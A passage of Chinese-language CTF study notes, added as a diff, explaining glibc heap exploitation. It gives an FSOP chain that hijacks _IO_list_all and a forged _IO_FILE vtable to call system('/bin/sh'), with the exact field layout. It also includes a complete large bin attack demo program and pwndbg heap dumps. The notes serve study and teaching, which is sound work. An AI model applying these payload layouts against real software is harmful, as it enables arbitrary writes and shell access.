+         buf[sizeof (buf) - 1] = '\0';
+         char *cp = _itoa_word ((uintptr_t) ptr, &buf[sizeof (buf) - 1], 16, 0);
+         while (cp > buf)
+           *--cp = '0';
+   
+         __libc_message (action & 2, "*** Error in `%s': %s: 0x%s ***\n",
+                         __libc_argv[0] ? : "<unknown>", str, cp);
+       }
+     else if (action & 2)
+       abort ();
+   }
+   ```
+
+2. 调用 `__libc_message`：
+
+   ```c
+   // sysdeps/posix/libc_fatal.c
+   /* Abort with an error message.  */
+   void
+   __libc_message (int do_abort, const char *fmt, ...)
+   {
+     [...]
+     if (do_abort)
+       {
+         BEFORE_ABORT (do_abort, written, fd);
+   
+         /* Kill the application.  */
+         abort ();
+       }
+   }
+   ```
+
+3. `do_abort` 调用 `fflush`，即 `_IO_flush_all_lockp`：abort()处理进程的时候，会调用_IO_flush_all_lockp遍历刷新所有的文件流，然后会调用_IO_FILE_plus.vtable中的_IO_overflow函数处理_IO_FILE结构体。
+
+   ```c
+   // stdlib/abort.c
+   #define fflush(s) _IO_flush_all_lockp (0)
+   
+     if (stage == 1)
+       {
+         ++stage;
+         fflush (NULL);
+       }
+   ```
+
+   ```c
+   // libio/genops.c
+   int
+   _IO_flush_all_lockp (int do_lock)
+   {
+     int result = 0;
+     struct _IO_FILE *fp;
+     int last_stamp;
+   
+   #ifdef _IO_MTSAFE_IO
+     __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
+     if (do_lock)
+       _IO_lock_lock (list_all_lock);
+   #endif
+   
+     last_stamp = _IO_list_all_stamp;
+     fp = (_IO_FILE *) _IO_list_all;   // 将其覆盖
+     while (fp != NULL)
+       {
+         run_fp = fp;
+         if (do_lock)
+   	_IO_flockfile (fp);
+   
+         if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
+   #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
+   	   || (_IO_vtable_offset (fp) == 0
+   	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
+   				    > fp->_wide_data->_IO_write_base))
+   #endif
+   	   )
+   	  && _IO_OVERFLOW (fp, EOF) == EOF)     // 将其修改为 system 函数
+   	result = EOF;
+   
+         if (do_lock)
+   	_IO_funlockfile (fp);
+         run_fp = NULL;
+   
+         if (last_stamp != _IO_list_all_stamp)
+   	{
+   	  /* Something was added to the list.  Start all over again.  */
+   	  fp = (_IO_FILE *) _IO_list_all;
+   	  last_stamp = _IO_list_all_stamp;
+   	}
+         else
+   	fp = fp->_chain;    // 指向我们指定的区域
+       }
+   
+   #ifdef _IO_MTSAFE_IO
+     if (do_lock)
+       _IO_lock_unlock (list_all_lock);
+     __libc_cleanup_region_end (0);
+   #endif
+   
+     return result;
+   }
+   ```
+
+   试想一下，如果所有文件流中，有一个_IO_FILE结构体的0字节偏移处被改写为"sh"，将_IO_FILE_plus.vtable中的_IO_overflow函数指针改写为system函数的地址，这时候执行`_IO_OVERFLOW (fp, EOF) == EOF)==>system('/bin/sh\x00')`
+
+   调用abort函数的三种情况，此时可以打FSOP：
+
+   1. libc执行abort时
+   2. 执行exit函数
+   3. main函数结束返回时
+
+我们已经将_IO_list_all的值改写为main_arena+88，接下来是关键一步：将unsorted bin chunk的size修改为0x61
+
+此时我们进行malloc操作时，由于大小不满足unsorted bin的大小检查，所以会调用abort函数
+
+调用abort函数时会调用 `_IO_flush_all_lockp` 函数，**顺着 `_IO_list_all` 链表，把所有打开的文件流都刷新（flush）一遍**
+
+当 `_IO_flush_all_lockp` 开始工作时，它看到的第一个“文件”是我们劫持的 `main_arena + 88`。`_mode` 字段被解析为正数或负数，当条件不满足刷新时，它会去找**下一个**文件流。
+
+它是怎么找下一个的？通过读取当前文件流的 `_chain` 指针。 在 64 位下，`_chain` 偏移是 `0x68`。 它会读取 `(main_arena + 88) + 0x68`，也就是 **`main_arena + 192`**
+
+最天才的一步来了：main_arena + 192这一位置恰好是堆管理器中 **`0x60` 大小的 Small Bin 的链表头**！
+
+因为我们在触发崩溃前的最后一次操作中，把伪造 Chunk 的 size 改成了 `0x61`。`malloc` 在报错前，刚好顺手把我们这个 Chunk 整理放进了 `0x60` 的 Small Bin 里，于是，`_chain` 完美地指向了我们在堆上伪造的 `_IO_FILE` 结构体
+
+伪造的IOFILE结构体：
+
+```c
+偏移      值/作用
+0x00:    b'/bin/sh\x00' (原来是 prev_size。这里放 /bin/sh，因为系统会把文件流指针本身作为参数传给 system)
+0x08:    0x61 (原来是 size。修改为 0x61，为了利用 0x60 smallbin 的 _chain)
+0x10:    随意值 (原来是 fd。这里对漏洞利用无影响)
+0x18:    _IO_list_all - 0x10 (原来是 bk。触发 Unsorted Bin Attack 劫持 _IO_list_all)
+0x20:    2 (对应 _IO_write_base)
+0x28:    3 (对应 _IO_write_ptr。需要满足 _IO_write_ptr > _IO_write_base 才能触发溢出刷新)
+... (中间用 0 填充)
+0xC0:    0 (对应 _mode。必须填 0 或者负数)
+... (中间用 0 填充)
+0xD8:    vtable 的地址 (指向下面你伪造的 vtable 区域，通常等于 `heap_base + offset`)
+0xE0:    ... 开始伪造 vtable ...
+0xE0 + 0x18 (即 0xF8): system_addr (对应 vtable 中的 __overflow 函数指针)
+```
+
+```text
+当系统读取到我们的 Fake File 时，为了让它执行刷新操作，我们伪造了以下条件：
+
+_mode = 0 (满足 <= 0 的检查)。
+
+_IO_write_ptr = 1 且 _IO_write_base = 0 (满足 ptr > base 的检查，说明有数据需要刷新)。
+
+条件全部满足，系统决定刷新文件。刷新的动作是调用虚表（vtable）里的 __overflow 函数。
+由于我们把 vtable 的指针指向了我们自己伪造的区域，并且把 __overflow 的位置填入了 system 的地址。
+
+最后，系统调用 system(fp)。而 fp（文件流的起始地址，也是我们 Chunk 的 user data 起始地址）被我们填入了 /bin/sh\x00。
+```
+
+至此成功getshell
+
+### largebin attack
+
+该技术可用于修改任意地址的值为一个堆地址，例如栈上的变量 stack_var1 和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在 fastbin attack 中用于修改全局变量 global_max_fast 为一个很大的值。
+
+```c
+修改large bin的bk与bk_nextsize，最后导致bk与bk_nextsize被写入下一个进入large bin的chunk的堆地址
+pwndbg> x/20gx 0x6036f0  -->p2
+0x6036f0:       0x0000000000000000      0x00000000000003f1-->为了绕过极值判断，p3 的大小 (0x410) 大于 p2 伪造的大小 (0x3f0，忽略标志位)，所以 (size) < (bck->bk->size) 为假，程序进入核心的 else 分支
+0x603700:       0x0000000000000000      0x00007fffffffda90（stack）
+0x603710:       0x0000000000000000      0x00007fffffffda88
+0x603720:       0x0000000000000000      0x0000000000000000
+```
+
+
+
+**原理：**
+
+```c
+// 1. 跳表指针插入操作（fd_nextsize, bk_nextsize）
+victim->fd_nextsize = fwd;
+victim->bk_nextsize = fwd->bk_nextsize;
+fwd->bk_nextsize = victim;
+victim->bk_nextsize->fd_nextsize = victim;  // <--- 攻击点 1
+
+// 2. 双向链表指针插入操作（fd, bk）
+bck = fwd->bk;
+// ...
+victim->bk = bck;
+victim->fd = fwd;
+fwd->bk = victim;
+bck->fd = victim;                           // <--- 攻击点 2
+```
 
 
 
 
 
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include<assert.h>
+ 
+int main()
+{
+    fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
+    fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
+           "global variable global_max_fast in libc for further fastbin attack\n\n");
+
+    unsigned long stack_var1 = 0;
+    unsigned long stack_var2 = 0;
+
+    fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
+    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
+    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);
+
+    unsigned long *p1 = malloc(0x420);
+    fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);
+
+    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
+           " the first large chunk during the free()\n\n");
+    malloc(0x20);
+
+    unsigned long *p2 = malloc(0x500);
+    fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);
+
+    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
+           " the second large chunk during the free()\n\n");
+    malloc(0x20);
+
+    unsigned long *p3 = malloc(0x500);
+    fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);
+ 
+    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
+           " the third large chunk during the free()\n\n");
+    malloc(0x20);
+ 
+    free(p1);
+    free(p2);
+    fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
+           " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));
+
+    malloc(0x90);
+    fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
+            " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
+            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
+            " [ %p ]\n\n", (void *)((char *)p1 + 0x90));
+
+    free(p3);
+    fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
+           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
+ 
+
+    fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
+            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
+    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
+            " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
+            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");
+
+    p2[-1] = 0x3f1;
+    p2[0] = 0;
+    p2[2] = 0;
+    p2[1] = (unsigned long)(&stack_var1 - 2);
+    p2[3] = (unsigned long)(&stack_var2 - 4);
+
+    //------------------------------------
+
+    malloc(0x90);
+ 
+    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
+            " During this time, targets should have already been rewritten:\n");
+
+    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
+    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
+
+    // sanity check
+    assert(stack_var1 != 0);
+    assert(stack_var2 != 0);
+
+    return 0;
+}
+
+```
+
+首先申请三个大的chunk（size>0x400），中间申请小的chunk防止free时合并
+
+```c
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x603000
+Size: 0x290 (with flag bits: 0x291)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603290
+Size: 0x430 (with flag bits: 0x431)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x6036c0
+Size: 0x30 (with flag bits: 0x31)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x6036f0
+Size: 0x510 (with flag bits: 0x511)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603c00
+Size: 0x30 (with flag bits: 0x31)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603c30
+Size: 0x510 (with flag bits: 0x511)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x604140
+Size: 0x30 (with flag bits: 0x31)
+
+Top chunk | PREV_INUSE
+Addr: 0x604170
+Size: 0x1fe90 (with flag bits: 0x1fe91)
+    
+    
+    
+//释放之后两个chunk先进入unsorted bin
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x603000
+Size: 0x290 (with flag bits: 0x291)
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x603290
+Size: 0x430 (with flag bits: 0x431)
+fd: 0x7ffff7e1ace0
+bk: 0x6036f0
+
+Allocated chunk
+Addr: 0x6036c0
+Size: 0x30 (with flag bits: 0x30)
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x6036f0
+Size: 0x510 (with flag bits: 0x511)
+fd: 0x603290
+bk: 0x7ffff7e1ace0
+
+Allocated chunk
+Addr: 0x603c00
+Size: 0x30 (with flag bits: 0x30)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603c30
+Size: 0x510 (with flag bits: 0x511)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x604140
+Size: 0x30 (with flag bits: 0x31)
+
+Top chunk | PREV_INUSE
+Addr: 0x604170
+Size: 0x1fe90 (with flag bits: 0x1fe91)
+
+    
+//malloc(0x90)后，堆管理器会将第一个chunk切割，并且整理剩下的chunk进入相应的bin中：
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x603000
+Size: 0x290 (with flag bits: 0x291)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603290
+Size: 0xa0 (with flag bits: 0xa1)
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x603330
+Size: 0x390 (with flag bits: 0x391)
+fd: 0x7ffff7e1ace0
+bk: 0x7ffff7e1ace0
+
+Allocated chunk
+Addr: 0x6036c0
+Size: 0x30 (with flag bits: 0x30)
+
+Free chunk (largebins) | PREV_INUSE//-->largebins
+Addr: 0x6036f0
+Size: 0x510 (with flag bits: 0x511)
+fd: 0x7ffff7e1b110
+bk: 0x7ffff7e1b110
+fd_nextsize: 0x6036f0
+bk_nextsize: 0x6036f0
+
+Allocated chunk
+Addr: 0x603c00
+Size: 0x30 (with flag bits: 0x30)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603c30
+Size: 0x510 (with flag bits: 0x511)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x604140
+Size: 0x30 (with flag bits: 0x31)
+
+Top chunk | PREV_INUSE
+Addr: 0x604170
+Size: 0x1fe90 (with flag bits: 0x1fe91)    
+    
+    
+    
+//free(p3),并且伪造p2
+
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x603000
+Size: 0x290 (with flag bits: 0x291)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603290
+Size: 0xa0 (with flag bits: 0xa1)
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x603330
+Size: 0x390 (with flag bits: 0x391)
+fd: 0x7ffff7e1ace0
+bk: 0x603c30
+
+Allocated chunk
+Addr: 0x6036c0
+Size: 0x30 (with flag bits: 0x30)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x6036f0
+Size: 0x3f0 (with flag bits: 0x3f1)
+
+Allocated chunk
+Addr: 0x603ae0
+Size: 0x00 (with flag bits: 0x00)
+    
+pwndbg> x/20gx 0x6036f0  -->p2
+0x6036f0:       0x0000000000000000      0x00000000000003f1
+0x603700:       0x0000000000000000      0x00007fffffffda90（stack）
+0x603710:       0x0000000000000000      0x00007fffffffda88
+0x603720:       0x0000000000000000      0x0000000000000000
+```
+
+需要注意的是 large bins 中 chunk 按 fd 指针的顺序从大到小排列，如果大小相同则按照最近使用顺序排列：
+
+```c
+// 1. 跳表指针插入操作（fd_nextsize, bk_nextsize）
+victim->fd_nextsize = fwd;
+victim->bk_nextsize = fwd->bk_nextsize;
+fwd->bk_nextsize = victim;
+victim->bk_nextsize->fd_nextsize = victim;  // <--- 攻击点 1
+
+// 2. 双向链表指针插入操作（fd, bk）
+bck = fwd->bk;
+// ...
+victim->bk = bck;
+victim->fd = fwd;
+fwd->bk = victim;
+bck->fd = victim;                           // <--- 攻击点 2
+```
+
+假设我们有一个漏洞，可以对 large bin 里的 chunk p2 进行修改，结合上面的整理过程，我们伪造 p2 如下：
+
+```c
+pwndbg> x/20gx 0x6036f0  -->p2
+0x6036f0:       0x0000000000000000      0x00000000000003f1-->为了绕过极值判断，p3 的大小 (0x410) 大于 p2 伪造的大小 (0x3f0，忽略标志位)，所以 (size) < (bck->bk->size) 为假，程序进入核心的 else 分支
+0x603700:       0x0000000000000000      0x00007fffffffda90（stack）
+0x603710:       0x0000000000000000      0x00007fffffffda88
+0x603720:       0x0000000000000000      0x0000000000000000
+```
+
+**第一次任意地址写 (利用跳表)**：
+
+- 代码执行：`victim->fd_nextsize = fwd;	fwd->bk_nextsize = victim;` （`victim->bk_nextsize` 变成了 `&stack_var2 - 0x20`）。
+- 代码执行：`victim->bk_nextsize->fd_nextsize = victim;`
+- **底层等价于**：`(&stack_var2 - 0x20) + 0x20 = victim`
+- **结果**：目标变量 `stack_var2` 成功被写入了 `p3` (即 `victim`) 的堆块地址！
+
+**准备物理链表写入**：
+
+- 代码执行：`bck = fwd->bk;` （此时 `bck` 被赋值为 `p2->bk`，也就是 `&stack_var1 - 0x10`）。
+
+**第二次任意地址写 (利用物理链表)**：
+
+- 代码跳出极值判断的 `if/else` 后，执行底部的链表更新：`bck->fd = victim;`
+- **底层等价于**：`(&stack_var1 - 0x10) + 0x10 = victim`
+- **结果**：目标变量 `stack_var1` 也成功被写入了 `p3` 的堆块地址！
+
+
+
+#### 2.39
+
+在2.39中，我们仅仅需要修改bk_nextsize为target - 0x20，即可。但同时要注意的是我们在add之前应该布置如下：
+
+```c
+large bin :
+Free chunk (largebins) | PREV_INUSE
+Addr: 0x56fec9ad4910
+Size: 0x790 (with flag bits: 0x791)
+fd: 0x73bbbfe20cc0
+bk: 0x73bbbfe20cc0
+fd_nextsize: 0x56fec9ad4910
+bk_nextsize: 0x73bbbfe21640
+    
+同时，我们需要有unsorted bin 中的一个chunk 该chunk的size<large bin的chunk，但同时要求他们的大小在同一个large bin的范围内
+    
+    
+Free chunk (largebins) | Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x56fec9ad3290
+Size: 0x780 (with flag bits: 0x781)
+fd: 0x73bbbfe20cc0
+bk: 0x73bbbfe20cc0
+fd_nextsize: 0x00
+bk_nextsize: 0x00
+   
+
+最后再malloc一个大chunk使unsorted bin chunk进入largebin中触发large bin attack
+```
 
 
 
